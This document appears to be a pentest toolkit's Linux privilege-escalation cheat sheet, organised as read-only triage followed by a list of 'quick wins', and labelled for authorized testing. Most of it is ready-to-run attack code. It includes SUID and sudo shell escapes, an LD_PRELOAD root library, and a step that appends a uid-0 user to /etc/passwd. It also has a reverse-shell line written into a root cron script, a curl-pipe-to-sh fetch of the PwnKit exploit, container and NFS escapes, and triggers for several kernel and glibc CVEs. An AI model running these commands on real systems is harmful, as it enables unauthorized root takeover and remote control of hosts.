---
service: linux
title: Linux Privilege Escalation
ports: n/a
aliases: linenum
---

# Linux PrivEsc — quick wins

**When you see it:** you have a low-privilege shell on a Linux host and want root.
Start with triage (read-only), then work top to bottom through the quick wins.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the
> target — get sign-off and clean up afterwards.

## Triage (read-only)
```sh
id && uname -r && cat /etc/os-release | head -4   # user context + kernel version
sudo -l                                            # NOPASSWD entries, LD_PRELOAD
find / -perm -4000 -type f 2>/dev/null            # SUID binaries
getcap -r / 2>/dev/null                            # capabilities
cat /etc/exports 2>/dev/null                       # NFS shares
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null    # cron jobs
groups                                             # docker, lxd, disk, adm?
```

## Quick wins

### SUID / GTFOBins
```sh
find / -perm -4000 -type f 2>/dev/null
# for each hit, check gtfobins.github.io — e.g. for /usr/bin/find:
/usr/bin/find . -exec /bin/sh -p \; -quit
```
*Why:* binaries with the SUID bit run as their owner (often root); GTFOBins catalogs
the exact invocations that break out. High hit rate on older distros and CTF-style boxes.

### sudo -l — NOPASSWD / shell escape
```sh
sudo -l                                  # spot NOPASSWD entries
# common escapes (GTFOBins covers all):
sudo /usr/bin/vim   -c ':!/bin/sh'
sudo /usr/bin/less  /etc/passwd   # then !sh
sudo /usr/bin/find  . -exec /bin/sh \; -quit
sudo /usr/bin/python3 -c 'import os;os.system("/bin/bash")'
```
*Why:* NOPASSWD on any GTFOBins binary → root without a password. Check every entry.

### sudo LD_PRELOAD (when env_keep += LD_PRELOAD)
```sh
# compile on target:
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
void _init() { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so SUDOCMD   # any allowed sudo binary
```
*Why:* if `sudoers` has `env_keep += LD_PRELOAD`, sudo passes it through and your
shared library constructor fires as root before the target binary runs.

### Baron Samedit — CVE-2021-3156 ✏️
```sh
# check: vulnerable = segfault or malloc error
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# exploit via public PoC (worawit/CVE-2021-3156):
python3 exploit_nss.py   # drops root shell
```
*Why:* heap overflow in sudo ≤1.9.5p1 / 1.8.31p2; no NOPASSWD required,
any local user → root. Affects defaults on Ubuntu, Debian, Fedora of that era.

### Capabilities — cap_setuid
```sh
getcap -r / 2>/dev/null | grep -i setuid
# if /usr/bin/python3.9 = cap_setuid+ep:
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
*Why:* cap_setuid+ep on any interpreter → root UID without SUID. Often overlooked
by defenders hardening SUID. Cross-reference GTFOBins for non-interpreter binaries.

### Writable /etc/passwd ✏️
```sh
ls -la /etc/passwd
# if writable:
HASH=$(openssl passwd -1 pass123)
echo "pwn:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
su pwn   # password: pass123
```
*Why:* a writable /etc/passwd lets you append a uid=0 user without touching sudoers.

### Writable cron job ✏️
```sh
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
# if a root-owned cron calls a world-writable script:
echo 'bash -i >& /dev/tcp/ATT/4444 0>&1' >> /PATH/TO/SCRIPT.sh
```
*Why:* cron runs scripts as the owning user; if root owns the cron but the script
is writable, you get a shell on next execution.

### Writable systemd unit ✏️
```sh
find /etc/systemd /lib/systemd -name '*.service' -writable 2>/dev/null
# edit ExecStart= of any root-run service, then:
systemctl daemon-reload && systemctl restart SERVICE
```
*Why:* systemd services run as their configured user (often root); a writable unit
file is direct code execution at next start/restart.

### PATH hijack
```sh
# look for root-owned scripts calling binaries without full path:
strings /usr/local/bin/some-script | grep -v '/'
# prefix your dir:
export PATH=/tmp:$PATH
printf '#!/bin/bash\nbash -i\n' > /tmp/BINARYNAME && chmod +x /tmp/BINARYNAME
```
*Why:* if a SUID or cron-called script uses relative binary names, planting a
same-named executable earlier in PATH intercepts the call.

### PwnKit — CVE-2021-4034 ✏️
```sh
# check: pkexec installed + unpatched
pkexec --version   # polkit < 0.120 on most distros
# exploit (ly4k/PwnKit — self-contained, no compile needed):
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```
*Why:* out-of-bounds write in pkexec (ships on nearly every distro since 2009)
allows any local user → root via environment variable manipulation; affects polkit
< 0.120 (patched Jan 2022).

### DirtyPipe — CVE-2022-0847 ✏️
```sh
uname -r   # vulnerable: 5.8 – 5.16.10 (excl. 5.15.25 / 5.10.102)
# public PoC (AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits):
./exploit-1  # overwrites a byte in a root-owned SUID → root shell
```
*Why:* arbitrary overwrite of read-only page-cache pages via a race in splice/pipe;
no special privileges required.

### Looney Tunables — CVE-2023-4911 ✏️
```sh
# check: segfault output = vulnerable (glibc < 2.38-r7 on Fedora/Ubuntu/Debian)
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" \
  "Z=$(python3 -c 'print("A"*192)')" /usr/bin/su --help
# segfault → exploit via Qualys PoC or KernelKrise/CVE-2023-4911
```
*Why:* buffer overflow in glibc's ld.so GLIBC_TUNABLES parser → full root on
default Fedora 37/38, Ubuntu 22.04/23.04, Debian 12/13 installs.

### OverlayFS — CVE-2023-0386 ✏️
```sh
uname -r   # affected: 5.11 – 6.1.8 (excl. 5.15.91); patched Feb 2023
# PoC: xkaneiki/CVE-2023-0386 — user-namespaced overlayfs SUID copy-up
make && ./fuse_overlay   # drops root shell
```
*Why:* OverlayFS copy-up preserves file capabilities across mounts that should
strip them; any unprivileged user with access to user namespaces → root.

### Docker / LXD group
```sh
groups | grep -E 'docker|lxd'
# docker:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd (import alpine image first):
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer host-root disk source=/ path=/mnt/root recursive=true
lxc start mycontainer && lxc exec mycontainer /bin/sh
```
*Why:* docker group = root equivalent (full host FS mount); lxd group = privileged
container with host root mapped into the container.

### NFS no_root_squash ✏️
```sh
# on target:
cat /etc/exports | grep no_root_squash   # confirm share
# on attack box (as root):
mkdir /tmp/nfs && mount -t nfs TARGET:/SHARE /tmp/nfs
cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash
# back on target:
/MOUNTPATH/bash -p   # root shell
```
*Why:* no_root_squash preserves root UID from the NFS client; mount the share
from an attack box where you are root, plant a SUID binary, execute on target.

## aranum helpers
- `standalones/linux/suid-gtfobins.sh` — enumerate SUID binaries and flag GTFOBins hits.
- `standalones/linux/sudo-enum.sh` — parse `sudo -l` for exploitable entries.
- `standalones/linux/capabilities-enum.sh` — `getcap -r /` with cap_setuid filtering.
- `standalones/linux/cron-enum.sh` — writable cron jobs and scripts called by root crons.
- `standalones/linux/writable-files.sh` — writable /etc/passwd, systemd units, paths.
- `standalones/linux/pwnkit-check.sh` — polkit version + PwnKit applicability.
- `standalones/linux/looney-check.sh` — glibc version + Looney Tunables check.
- `standalones/linux/overlayfs-check.sh` — kernel version + OverlayFS CVE-2023-0386 check.
- `standalones/linux/io-uring-check.sh` — kernel io_uring privilege exposure check.
- `standalones/linux/linenum-fast.sh` — rapid broad-sweep enumeration (runs most of the above).
- `standalones/linux/creds-hunt.sh` — search for hardcoded creds, SSH keys, history.
- `standalones/linux/group-enum.sh` — flag membership in docker, lxd, disk, shadow, adm.
- `standalones/linux/container-detect.sh` — detect if running inside a container (cgroup/proc).
- `aranumtoolkit/network/bulk-enum-linux.sh` (via `aranum.py bulk-linux`) — full host
  enumeration sweep, runs standalones in sequence and collects output.

## Gotchas
- Kernel exploits (DirtyPipe, Looney, OverlayFS) require matching kernel/glibc; check
  `uname -r` and distro package version before fetching a PoC.
- Baron Samedit: `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` returning a "usage"
  error (not a crash) means the host is patched — move on.
- Docker escape requires network access to pull an image or a pre-loaded one; `docker images`
  shows what's cached.
- NFS exploit requires root on the attack box; if you only have a low-priv shell elsewhere,
  this path is blocked.
- `/etc/passwd` write technique fails if the system uses shadow passwords with an `x`
  placeholder and NIS/LDAP validation — confirm first with `getent passwd root`.

## Sources
- HackTricks Linux Privilege Escalation (`book.hacktricks.xyz/linux-hardening/privilege-escalation`).
- GTFOBins (`gtfobins.github.io`) — SUID, sudo, capabilities breakouts.
- PayloadsAllTheThings Linux PrivEsc (`github.com/swisskyrepo/PayloadsAllTheThings`).
- Qualys CVE-2021-3156 (Baron Samedit), CVE-2021-4034 (PwnKit), CVE-2023-4911 (Looney Tunables).
- CVE-2022-0847 (DirtyPipe) — AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.
- CVE-2023-0386 (OverlayFS) — Datadog Security Labs advisory.
